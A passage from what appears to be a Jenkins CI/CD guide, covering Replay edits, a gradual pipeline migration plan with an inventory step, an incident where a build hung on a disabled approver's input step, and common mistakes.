does: Edit the pipeline in Replay and rerun to test a fix. If it fails or is weak: Replay edits are not saved, so copy them into the repository. Migrating without a big bang Start with an inventory : list every job, its last run and its owner. Retire jobs that nobody runs. Move build logic into scripts or a Makefile so it runs anywhere. Translate triggers, credentials and approvals one by one (a shared library step may become a reusable workflow or an included template). Run the old and new pipelines side by side until results match, then switch the required check and archive the old job. $ jenkins-inventory --since 180d jobs: 214 ran in last 180 days: 61 owner unknown: 98 Incident: The pipeline that hung for two days Incident A build waited for an input step that was only visible to a person who had left the company. Waiting for input: Deploy to production? Approver list: [alice] (account disabled) Build running for 49 hours The build held an executor and a lock on the deploy environment. The fix was to give the input step a timeout and a group approver, and to alert on builds running longer than a set time. Common mistakes Restarting the controller before reading the queue reason Editing jobs in Replay and forgetting to commit the fix Starting a migration with no inventory Moving everything at once instead of one pipeline at a time"}});